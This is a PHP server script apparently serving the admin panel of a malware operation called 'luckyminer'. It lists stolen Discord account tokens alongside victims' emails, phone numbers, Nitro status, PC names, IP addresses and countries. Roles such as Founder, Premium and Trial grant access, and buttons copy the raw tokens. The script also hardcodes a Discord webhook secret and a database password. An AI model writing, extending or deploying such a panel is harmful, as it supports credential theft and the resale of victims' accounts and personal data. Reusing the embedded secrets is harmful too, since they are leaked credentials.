<?php
session_start();


// Set content type to JSON
header('Content-Type: application/json');

// Validate session data
$role = $_SESSION['Role'] ?? '';
$secretkey = $_SESSION['secret_key'] ?? '';
$usernameax = $_SESSION['admin_name'] ?? '';

/**
 * Send log to Discord webhook
 */
function SendLog($message)
{
    if (!is_string($message) || strlen($message) > 2000) {
        return false;
    }

    $webhookURL = "https://discord.com/api/webhooks/1194124696627728455/jtLVRNFyfepgvlkKpFG__hxeMcLwTafi3n39BVg8yelzDbShqL-L4-yrGwke0-o5eS2O";

    $payload = json_encode(['content' => $message]);
    $headers = ['Content-Type: application/json'];

    $ch = curl_init($webhookURL);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    $response = curl_exec($ch);
    curl_close($ch);

    return $response !== false;
}

/**
 * Validate string length
 */
function isStringLengthGreaterThan5($inputString)
{
    return is_string($inputString) && strlen($inputString) > 5;
}

/**
 * Validate user permissions
 */
function validateUserPermissions($role, $secretkey, $usernameax)
{
    if (empty($role) || empty($secretkey) || empty($usernameax)) {
        return false;
    }

    $validRoles = ['Founder', 'Admin', 'Special', 'Premium', 'Trial', 'User'];
    return in_array($role, $validRoles);
}

/**
 * Create secure database connection
 */
function createDatabaseConnection()
{
    $host = 'localhost';
    $dbname = 'luckyminer';
    $db_username = 'miner';
    $db_password = 'Sifre.12345';

    try {
        $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8mb4", $db_username, $db_password);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        return $pdo;
    } catch (PDOException $e) {
        error_log("Database connection failed: " . $e->getMessage());
        return false;
    }
}

/**
 * Sanitize input for display
 */
function sanitizeForDisplay($input)
{
    return htmlspecialchars($input ?? '', ENT_QUOTES, 'UTF-8');
}

/**
 * Build base WHERE clause based on role
 */
function buildRoleBasedWhere($role, $usernameax, $secretkey)
{
    $baseWhere = "WHERE 1 = 1";
    $params = [];

    if ($role === "Founder" /*|| $usernameax == "44444"*/) {
        if ($usernameax !== "Hopesar") {
            $baseWhere .= " AND tokens.Username NOT LIKE :exclude_hopp 
                           AND tokens.Username NOT LIKE :exclude_emre 
                           AND tokens.Username NOT LIKE :exclude_hoppy 
                           AND tokens.Username NOT LIKE :exclude_hopes";
            $params['exclude_hopp'] = '%hopp%';
            $params['exclude_emre'] = '%emre%';
            $params['exclude_hoppy'] = '%hoppy%';
            $params['exclude_hopes'] = '%hopes%';
        }
    } else {
        $baseWhere .= " AND tokens.OwnerID = :owner_id";
        $params['owner_id'] = $secretkey;
    }

    return [$baseWhere, $params];
}

// Main execution
try {
    // Validate HTTP method
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        throw new Exception('Invalid request method');
    }

    // Validate session and permissions
    if (!validateUserPermissions($role, $secretkey, $usernameax) || !isStringLengthGreaterThan5($secretkey)) {
        http_response_code(403);
        echo json_encode(['error' => 'Access denied - Invalid session or insufficient permissions']);
        exit;
    }

    // Create database connection
    $pdo = createDatabaseConnection();
    if (!$pdo) {
        http_response_code(500);
        echo json_encode(['error' => 'Database connection failed']);
        exit;
    }

    // Validate and sanitize DataTables parameters
    $draw = filter_input(INPUT_POST, 'draw', FILTER_VALIDATE_INT);
    $start = filter_input(INPUT_POST, 'start', FILTER_VALIDATE_INT);
    $length = filter_input(INPUT_POST, 'length', FILTER_VALIDATE_INT);

    if ($draw === false || $start === false || $length === false) {
        throw new Exception('Invalid DataTables parameters');
    }

    // Limit length to prevent excessive data retrieval
    $length = min($length, 1000);

    // Get and validate search value
    $searchValue = '';
    if (isset($_POST['search']['value'])) {
        $rawSearchValue = $_POST['search']['value'];
        if (is_string($rawSearchValue) && strlen($rawSearchValue) > 0) {
            $searchValue = substr(trim($rawSearchValue), 0, 100); // Limit to 100 chars
        }
    }

    // Define sortable columns (whitelist approach)
    $sortableColumns = [
        0 => 'tokens.Username',
        1 => 'm.PcName',
        2 => 'tokens.Email',
        3 => 'tokens.Phone',
        4 => 'tokens.nitro',
        5 => 'm.IP',
        6 => 'tokens.UserID',
        7 => 'tokens.TokenID'
    ];

    // Validate sorting parameters
    $orderColumnIndex = filter_input(INPUT_POST, 'order', FILTER_DEFAULT, FILTER_REQUIRE_ARRAY);
    $orderColumn = 'tokens.TokenID'; // Default sort column
    $orderDirection = 'DESC'; // Default sort direction

    if (is_array($orderColumnIndex) && isset($orderColumnIndex[0]['column']) && isset($orderColumnIndex[0]['dir'])) {
        $columnIndex = intval($orderColumnIndex[0]['column']);
        $direction = strtoupper($orderColumnIndex[0]['dir']);

        if (isset($sortableColumns[$columnIndex]) && in_array($direction, ['ASC', 'DESC'])) {
            $orderColumn = $sortableColumns[$columnIndex];
            $orderDirection = $direction;
        }
    }

    // Build role-based WHERE clause
    list($baseWhere, $params) = buildRoleBasedWhere($role, $usernameax, $secretkey);

    // Add search conditions if search value exists
    $searchWhere = "";
    if (!empty($searchValue)) {
        $searchWhere = " AND (
            tokens.UserID LIKE :search1 OR
            tokens.Username LIKE :search2 OR
            tokens.Email LIKE :search3 OR
            tokens.Phone LIKE :search4 OR
            CONCAT(tokens.verified, ' | ', tokens.nitro) LIKE :search5 OR
            m.PcName LIKE :search6 OR
            m.IP LIKE :search7
        )";
        $searchPattern = '%' . $searchValue . '%';
        $params['search1'] = $searchPattern;
        $params['search2'] = $searchPattern;
        $params['search3'] = $searchPattern;
        $params['search4'] = $searchPattern;
        $params['search5'] = $searchPattern;
        $params['search6'] = $searchPattern;
        $params['search7'] = $searchPattern;
    }

    // Build the main data query
    $dataQuery = "SELECT tokens.*, 
                         m.PcName, 
                         CONCAT(m.IP, ' | ', m.Country) AS IPCOUNTRaY
                  FROM tokens
                  LEFT JOIN (
                      SELECT HWID, PcName, IP, Country
                      FROM miners
                      GROUP BY HWID
                  ) m ON tokens.HWID = m.HWID
                  $baseWhere $searchWhere 
                  ORDER BY $orderColumn $orderDirection 
                  LIMIT :start, :length";

    $stmt = $pdo->prepare($dataQuery);

    // Bind parameters
    foreach ($params as $key => $value) {
        $stmt->bindValue(":$key", $value, PDO::PARAM_STR);
    }
    $stmt->bindValue(':start', $start, PDO::PARAM_INT);
    $stmt->bindValue(':length', $length, PDO::PARAM_INT);

    $stmt->execute();
    $results = $stmt->fetchAll();

    // Process results
    $data = [];
    foreach ($results as $row) {
        // Truncate long values for display
        $UserID = (strlen($row['UserID'] ?? '') > 15) ? substr($row['UserID'], 0, 15) . '...' : ($row['UserID'] ?? '');
        $names = (strlen($row['Username'] ?? '') > 15) ? substr($row['Username'], 0, 15) . '...' : ($row['Username'] ?? '');
        $email = (strlen($row['Email'] ?? '') > 20) ? substr($row['Email'], 0, 20) . '...' : ($row['Email'] ?? '');
        $phone = (strlen($row['Phone'] ?? '') > 15) ? substr($row['Phone'], 0, 15) . '...' : ($row['Phone'] ?? '');

        // Determine nitro state
        $nitrostate = ($row['nitro'] == '2') ? 'Boosted Nitro' : (($row['nitro'] == '1') ? 'Classic Nitro' : 'No Nitro');
        $VerifiedNitro = ($row['verified'] ?? '') . " | " . $nitrostate;

        // Generate secure token button
        $tokenId = intval($row['TokenID']);
        $token = sanitizeForDisplay($row['Token']);
        $tokenlink = '<button class="bg px-4 py-1 rounded text-stone-300 btn2 mr-1" onclick="copyText(\'' . $token . '\')"><i class="fa-solid fa-copy icon2 miAuto text-sm"></i></button>';

        if ($row['isvalid'] == '0' && $role != 'Trial') {
            $tokenlink = '<button class="bgCol px-4 py-1 rounded text-stone-300 btn2 mr-1" onclick="copyText(\'' . $token . '\')"><i class="fa-solid fa-copy icon2 miAuto text-sm"></i></button>';
        }

        // Generate profile picture
        $discordpfp = ($row['pfp'] != 'Default' && !empty($row['pfp'])) ?
            sanitizeForDisplay($row['pfp']) :
            'https://cdn.discordapp.com/attachments/1166459182002737307/1181003552135594034/g3OEi0y.png';

        // Generate action buttons
        $actionButtons = '<div class="pt-2">' .
            $tokenlink .
            ' <button class="bgCol px-4 py-1 rounded text-stone-300" onclick="deleteRecord(' . $tokenId . ')"><i class="fa-solid fa-trash miAuto text-sm"></i></button>' .
            '</div>';

        // Generate name with profile picture
        $username = sanitizeForDisplay($row['Username']);
        $namepfp = '<div class="flex">
                <h1>
                    <img src="' . $discordpfp . '" alt="Profile Picture" style="margin-right: 10px;">' .
            '<a href="javascript:void(0);" class="hover-link" onclick="copyText(\'' . $username . '\')">' . sanitizeForDisplay($names) . '</a>' .
            '</h1>
            </div>';

        $data[] = [
            $namepfp,
            sanitizeForDisplay($row['PcName'] ?? ''),
            '<a href="javascript:void(0);" class="hover-link" onclick="copyText(\'' . sanitizeForDisplay($row['Email']) . '\')">' . sanitizeForDisplay($email) . '</a>',
            '<a href="javascript:void(0);" class="hover-link" onclick="copyText(\'' . sanitizeForDisplay($row['Phone']) . '\')">' . sanitizeForDisplay($phone) . '</a>',
            sanitizeForDisplay($VerifiedNitro),
            sanitizeForDisplay($row['IPCOUNTRaY'] ?? ''),
            '<a href="javascript:void(0);" class="hover-link" onclick="copyText(\'' . sanitizeForDisplay($row['UserID']) . '\')">' . sanitizeForDisplay($UserID) . '</a>',
            $actionButtons
        ];
    }

    // Get total count
    $countQuery = "SELECT COUNT(tokens.TokenID) as total 
                   FROM tokens
                   LEFT JOIN (
                       SELECT HWID, PcName, IP, Country
                       FROM miners
                       GROUP BY HWID
                   ) m ON tokens.HWID = m.HWID
                   $baseWhere $searchWhere";

    $countStmt = $pdo->prepare($countQuery);

    // Bind the same parameters for count query (excluding LIMIT params)
    foreach ($params as $key => $value) {
        $countStmt->bindValue(":$key", $value, PDO::PARAM_STR);
    }

    $countStmt->execute();
    $totalRecords = $countStmt->fetch()['total'];

    // Prepare response
    $response = [
        'draw' => $draw,
        'recordsTotal' => intval($totalRecords),
        'recordsFiltered' => intval($totalRecords),
        'data' => $data
    ];

    echo json_encode($response, JSON_UNESCAPED_UNICODE);
} catch (Exception $e) {
    // Log error and return generic error response
    error_log("Tokens DataTables Error: " . $e->getMessage());

    http_response_code(500);
    echo json_encode([
        'draw' => $draw ?? 0,
        'recordsTotal' => 0,
        'recordsFiltered' => 0,
        'data' => [],
        'error' => 'An error occurred while processing your request'
    ]);
}
